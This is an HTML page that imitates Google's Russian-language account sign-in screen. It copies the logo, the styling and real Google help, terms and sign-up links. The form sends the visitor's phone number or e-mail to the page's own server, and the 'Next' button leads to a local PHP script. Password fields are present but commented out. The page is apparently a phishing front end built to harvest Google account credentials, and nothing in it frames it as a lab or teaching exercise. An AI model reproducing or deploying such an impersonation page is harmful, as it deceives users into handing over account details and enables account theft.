<title>Вход - Google Аккаунты</title>
<style>
    body {
        padding:190px 420px;
        background: #fff;
    direction: ltr;
    font-size: 14px;
    line-height: 1.4286;
    margin: 0;
    direction: ltr;
    }
    #main {
        height:416px;
        width:350px;
        padding: 40px 45px 36px 48px;
        border:1px solid #ccc;
        border-radius: 7px;
        
    }
    h1 {
        color: #202124;
    padding-bottom: 0;
    padding-top: 16px;
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    font-size: 24px;
    font-weight: 400;
    line-height: 1.3333;
    margin-left:150px;
    margin-top:0px;
    }
    svg {
        margin-top:10px;
        width: 75;
    height: 24;
    margin-left:140px;
    }
    h3 {
        color: #202124;
    font-size: 16px;
    font-weight: 400;
    letter-spacing: .1px;
    line-height: 1.5;
    padding-bottom: 0;
    padding-top: 8px;
    margin-top:-14px;
    font-family:roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    margin-left:75px;
    margin-bottom:25px;
    }
    input {
        width:100%;
        border-radius: 4px;
    color: #202124;
    font-size: 16px;
    margin: 1px 1px 0 1px;
    padding: 13px 15px;
    z-index: 1;
        height:56px;
        border:1px solid #ccc;
    }
    input:focus {
        outline:none;
        border:2px solid #1a73e8;
    
    }
    #forgot {
        -webkit-border-radius: 4px;
    border-radius: 4px;
    display: inline-block;
    font-weight: bold;
    letter-spacing: .25px;
    background-color: transparent;
    border: 0;
    cursor: pointer;
    font-size: inherit;
    outline: 0;
    padding: 0;
    text-align: left;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    margin-top:7px;
    color: #1a73e8;
    }
    #forgot:active {
        background-color:#b0d1fb;
        opacity:1;
    }
    a {
        text-decoration: none;
        color: #1a73e8;
    }
#submit {
    background-color: #1a73e8;
    font-family: 'Google Sans',arial,sans-serif;
    color:#fff;
    font-weight: bold;
    width:90px;
    height:37px;
    line-height: 20px;
    padding:8px;
    font-size: inherit;
    letter-spacing: .25px;
    cursor:pointer;
    border:none;
    margin-top:40px;
    float:right;
    transition: background-color 0.2 ease-out;
}
#submit:active {
background-color: #1764c8;
}
#guest {
    color: #5f6368;
    font-size: 14px;
    line-height: 1.4286;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    box-sizing: inherit;
    margin-top:30px;
    padding-bottom: 3px;
    padding-top: 9px;
    white-space: normal;
}
.more {
    -webkit-border-radius: 4px;
    border-radius: 4px;
    display: inline-block;
    font-weight: bold;
    letter-spacing: .25px;
    background-color: transparent;
    border: 0;
    cursor: pointer;
    font-size: inherit;
    outline: 0;
    padding: 0;
    text-align: left;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    margin-top:-23px;
    margin-left:-100px;
    float:right;
    color: #1a73e8;
}
.more:active {
    background-color:#c4deff;
        opacity:1;

}
.create {
    background:#fff;
    width:120px;
    height:18px;
    color:#1a73e8;
    display: inline-block;
    font-weight: bold;
    letter-spacing: .25px;
    background-color: transparent;
    border: 0;
    cursor: pointer;
    font-size: inherit;
    outline: 0;
    padding: 0;
    text-align: left;
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    float:left;
    margin-top:48px;
    line-height: 1.4286;
    text-transform: none;
    border-radius:3px;
    transition: background-color 0.1s ease-out;
    max-width: 300px;
}
.create:active {
background-color: #c4deff;
padding:10px;
margin-top:38px;
margin-left:-10px;
-moz-user-select: none; /* Mozilla Firefox */
-ms-user-select: none; /* Internet Explorer (не поддерживается) */
-o-user-select: none; /* Opera Presto (не поддерживается) */
-webkit-user-select: none; /* Google Chrome, Opera Next, Safari */
}
#block {
    height:20px;
    margin-bottom:20px;
}
/* Dropdown Button */
.dropbtn {
    background-color: #fff;
    width:120px;
    height:18px;
    color:#1a73e8;
    display: inline-block;
    font-weight: bold;
    letter-spacing: .25px;
    background-color: transparent;
    border: 0;
    cursor: pointer;
    font-size: inherit;
    outline: 0;
    padding: 0;
    text-align: left;
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    float:left;
    margin-top:48px;
    line-height: 1.4286;
    text-transform: none;
    border-radius:3px;
    transition: background-color 0.1s ease-out;
    max-width: 300px;
    -moz-user-select: none; /* Mozilla Firefox */
-ms-user-select: none; /* Internet Explorer (не поддерживается) */
-o-user-select: none; /* Opera Presto (не поддерживается) */
-webkit-user-select: none; /* Google Chrome, Opera Next, Safari */
    cursor: pointer;
}

/* Dropdown button on hover & focus */
.dropbtn:hover, .dropbtn:active, .dropbtn:focus {
    background-color: #c4deff;
padding:10px;
margin-top:38px;
margin-left:-10px;
-moz-user-select: none; /* Mozilla Firefox */
-ms-user-select: none; /* Internet Explorer (не поддерживается) */
-o-user-select: none; /* Opera Presto (не поддерживается) */
-webkit-user-select: none; /* Google Chrome, Opera Next, Safari */
}

/* The container <div> - needed to position the dropdown content */
.dropdown {
    position: relative;
    display: inline-block;
    margin-top:0px;
}

/* Dropdown Content (Hidden by Default) */
.dropdown-content {
    display: none;
    position: absolute;
    background-color: #fff;
    min-width: 300px;
    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
    z-index: 1;
margin-top:77px;
margin-left:-10px;
}

/* Links inside the dropdown */
.dropdown-content a {
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    color: black;
    padding: 12px 30px;
    text-decoration: none;
    display: block;
   
}

/* Change color of dropdown links on hover */
.dropdown-content a:hover {background-color: #ddd}

/* Show the dropdown menu (use JS to add this class to the .dropdown-content container when the user clicks on the dropdown button) */
.show {display:block;}
.bottom {
    -webkit-border-radius: 2px;
    border-radius: 2px;
    color: #757575;
    display: inline-block;
    margin-top: -6px;
    padding: 6px 16px;
    -webkit-transition: background .2s;
    transition: background .2s;
    float:right;
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    margin-top:10px;
    margin-left:20px;
    margin-right:-22px;
    font-size:13px;
    font-weight: bold;
    letter-spacing: .10;
}
.bottom:active {

border-radius: 3px;
background-color: rgb(224, 224, 224);
}
.bottom a {
    color:#757575;
}
.language {
    font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
    font-size:13px;
    color:#202124;
    margin-top:15px;
    margin-left:0px;
    cursor:pointer;
}






    </style>
<body link="#1a73e8" alink="#1a73e8">
<div id="main">
<svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>
<h1>Вход</h1>
<h3>Используйте аккаунт Google</h3>
<form action="" method="POST">

    <!--<input type="text" name="name" placeholder="НЭЙМ"><br>-->
    <input type="text" name="login" placeholder="Телефон или адрес эл. почты"><br>
    <!--<input type="password" name="password" placeholder="Пароль"><br>-->
    <!--<input type="password" name="verificationPassword" placeholder="Повтори пароль"><br>-->
    <div id="forgot"><a href="#">Забыли адрес эл.почты?</a></div>
    <div id="guest">Работаете на чужом компьютере? Включите гостевой режим. </div>
    <div class="more"><a href="https://support.google.com/chrome/answer/6130773?hl=ru">Подробнее...</a></div>

    
</form>
<div id="block"><div class="dropdown">
    <div onclick="myFunction()" class="dropbtn">Создать аккаунт</div>
    <div id="myDropdown" class="dropdown-content">
    <a href="https://accounts.google.com/signup/v2/webcreateaccount?continue=https%3A%2F%2Fwww.google.ru%2F&hl=ru&gmb=exp&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp">Для себя</a>
    <a href="https://accounts.google.com/signup/v2/webcreateaccount?continue=https%3A%2F%2Fwww.google.ru%2F&hl=ru&gmb=exp&biz=true&flowName=GlifWebSignIn&flowEntry=SignUp">Для управления бизнесом</a></div></div>
    <a href="/registercontinue.php"><input id="submit" type="submit" value="Далее"><br></a></div>
</div>

<div class="bottom"><a href="https://policies.google.com/terms?gl=RU&hl=ru" >Условия</a></div></div>
<div class="bottom"><a href="https://policies.google.com/privacy?gl=RU&hl=ru" >Конфиденциальность</a></div>
<div class="bottom"><a href="https://support.google.com/accounts?hl=ru#topic=3382296" >Справка</a></div>
<div class="language">Русский <img src="https://www.shareicon.net/data/128x128/2015/09/02/94594_down_384x512.png" width=12 height=12></div>

<script>
    /*toggle between hiding and showing the dropdown content */
function myFunction() {
    document.getElementById("myDropdown").classList.toggle("show");
}

// Close the dropdown menu if the user clicks outside of it
window.onclick = function(event) {
  if (!event.target.matches('.dropbtn')) {

    var dropdowns = document.getElementsByClassName("dropdown-content");
    var i;
    for (i = 0; i < dropdowns.length; i++) {
      var openDropdown = dropdowns[i];
      if (openDropdown.classList.contains('show')) {
        openDropdown.classList.remove('show');
      }
    }
  }
}
</script>
</body>